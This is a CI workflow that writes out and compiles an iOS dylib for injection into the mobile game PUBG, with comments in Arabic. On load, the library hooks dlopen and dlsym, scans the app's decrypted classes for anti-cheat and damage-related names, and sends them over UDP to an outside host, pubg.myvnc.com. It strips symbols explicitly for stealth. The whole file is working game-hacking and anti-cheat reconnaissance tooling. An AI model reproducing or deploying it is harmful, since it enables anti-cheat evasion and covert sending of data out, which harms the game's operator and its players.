name: Imperial V-MAX - RDP Master Dumper

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_rdp_dumper:
    name: Compile RDP Dumper Dylib
    runs-on: macos-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Prepare Workspace & Download Fishhook
        run: |
          mkdir -p jni
          echo "Downloading fishhook for Non-JB compatibility..."
          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h

      - name: Generate C++ Payload (The Dumper Core)
        run: |
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #import <sys/socket.h>
          #import <netinet/in.h>
          #import <arpa/inet.h>
          #import <netdb.h>
          #import <dlfcn.h>
          #import <objc/runtime.h>
          #include "fishhook.h"

          /**
           * ========================================================
           * 🛡️ MASOUD ULTIMATE RDP DUMPER (NON-JB)
           * 🎯 سحب الفريم ووركات، الدوال، وكلاسات الذاكرة للسيرفر
           * ========================================================
           */

          // ⚠️ إعدادات سيرفر المهندس مسعود
          #define RDP_DOMAIN "pubg.myvnc.com"
          #define RDP_PORT 8080

          struct sockaddr_in server_addr;
          BOOL isServerResolved = NO;

          // 🌐 1. ترجمة النطاق إلى IP (لضمان الاتصال السريع)
          void ResolveRDPServer() {
              struct hostent *host = gethostbyname(RDP_DOMAIN);
              if (host != NULL) {
                  memset(&server_addr, 0, sizeof(server_addr));
                  server_addr.sin_family = AF_INET;
                  server_addr.sin_port = htons(RDP_PORT);
                  server_addr.sin_addr.s_addr = *(long *)(host->h_addr_list[0]);
                  isServerResolved = YES;
                  NSLog(@"[MASOUD LAB] 🦅 RDP Server Resolved: %s", inet_ntoa(server_addr.sin_addr));
              } else {
                  NSLog(@"[MASOUD LAB] ❌ Failed to resolve RDP domain.");
              }
          }

          // 📡 2. دالة إرسال البيانات الصاروخية للـ RDP
          void SendToRDP(NSString* type, NSString* data) {
              if (!isServerResolved) return;

              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                  NSDictionary *payload = @{ @"type": type, @"data": data };
                  NSData *json = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
                  if (!json) return;

                  int sock = socket(AF_INET, SOCK_DGRAM, 0);
                  if (sock < 0) return;

                  sendto(sock, [json bytes], [json length], 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
                  close(sock);
              });
          }

          // ==========================================
          // 🕵️ الجواسيس (Hooks - Fishhook)
          // ==========================================

          // 1. جاسوس بوابة التحميل (dlopen) - يصيد الفريم ووركات
          static void* (*orig_dlopen)(const char *path, int mode);
          void* my_dlopen(const char *path, int mode) {
              if (path != NULL) {
                  NSString *pathStr = [NSString stringWithUTF8String:path];
                  if ([pathStr containsString:@"Frameworks"] || [pathStr containsString:@".dylib"] || [pathStr containsString:@"anogs"]) {
                      SendToRDP(@"FRAMEWORK", [pathStr lastPathComponent]);
                  }
              }
              return orig_dlopen(path, mode);
          }

          // 2. جاسوس سحب الدوال (dlsym) - يصيد الأكواد التي يتم سحبها
          static void* (*orig_dlsym)(void* handle, const char* symbol);
          void* my_dlsym(void* handle, const char* symbol) {
              if (symbol != NULL) {
                  NSString *symStr = [NSString stringWithUTF8String:symbol];
                  // فلترة دوال النظام العادية لمنع الضغط على السيرفر
                  if (![symStr hasPrefix:@"CF"] && ![symStr hasPrefix:@"UI"] && ![symStr hasPrefix:@"NS"]) {
                      SendToRDP(@"FUNCTION", symStr);
                  }
              }
              return orig_dlsym(handle, symbol);
          }

          // ==========================================
          // 🧠 ماسح الذاكرة الآمن (Safe Memory Scanner)
          // ==========================================
          void StartMemoryScanner() {
              NSLog(@"[MASOUD LAB] 🧠 Scanning Decrypted Memory...");
              
              int numClasses = objc_getClassList(NULL, 0);
              Class *classes = (Class *)malloc(sizeof(Class) * numClasses);
              numClasses = objc_getClassList(classes, numClasses);
              
              for (int i = 0; i < numClasses; i++) {
                  NSString *className = NSStringFromClass(classes[i]);
                  // صيد كلاسات اللعبة والحماية بعد فك التشفير
                  if ([className containsString:@"STExtra"] || [className containsString:@"AntiCheat"] || [className containsString:@"Damage"]) {
                      SendToRDP(@"MEMORY_DUMP", [NSString stringWithFormat:@"Decrypted Class: %@", className]);
                  }
              }
              free(classes);
              NSLog(@"[MASOUD LAB] ✅ Memory Scan Sent to RDP.");
          }

          // ==========================================
          // 🚀 التفعيل المركزي للدايلب
          // ==========================================
          __attribute__((constructor))
          static void masoud_master_init() {
              // 1. ترجمة النطاق وزرع الجواسيس فوراً
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                  ResolveRDPServer();
                  
                  struct rebinding hooks[] = {
                      {"dlopen", (void *)my_dlopen, (void **)&orig_dlopen},
                      {"dlsym", (void *)my_dlsym, (void **)&orig_dlsym}
                  };
                  rebind_symbols(hooks, 2);
                  
                  NSLog(@"[MASOUD LAB] 🦅 Ultimate Dumper Active (RDP Mode)");
              });
              
              // 2. فحص الذاكرة بعد 15 ثانية (ننتظر فك التشفير باللعبة)
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                  StartMemoryScanner();
              });
          }
          EOF

      - name: Compile and Link Dylib
        run: |
          echo "Compiling the masterpiece..."
          # تمت إضافة -lobjc لدعم دوال فحص الذاكرة الخاصة بـ Objective-C
          clang++ -dynamiclib -std=c++11 -arch arm64 \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          jni/main.mm jni/fishhook.c -o Masoud-RDP-Dumper.dylib \
          -framework Foundation -lobjc
          
          echo "Stripping symbols for maximum stealth..."
          strip -x Masoud-RDP-Dumper.dylib

      - name: Upload The Arsenal
        uses: actions/upload-artifact@v4
        with:
          name: Masoud-RDP-Dumper
          path: Masoud-RDP-Dumper.dylib
